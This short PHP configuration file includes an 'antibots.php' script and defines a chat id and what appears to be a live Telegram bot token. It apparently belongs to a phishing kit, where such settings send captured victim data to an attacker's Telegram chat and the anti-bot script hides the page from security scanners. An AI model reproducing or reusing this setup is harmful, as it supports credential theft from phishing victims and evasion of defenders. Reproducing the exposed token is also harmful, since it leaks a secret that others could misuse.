<?php
include "antibots.php";
$id="-4551490551";
$tokn="7027143740:AAHVTEyopC8HLxTKVy3UkbUeXZD__UVYHI8";
?>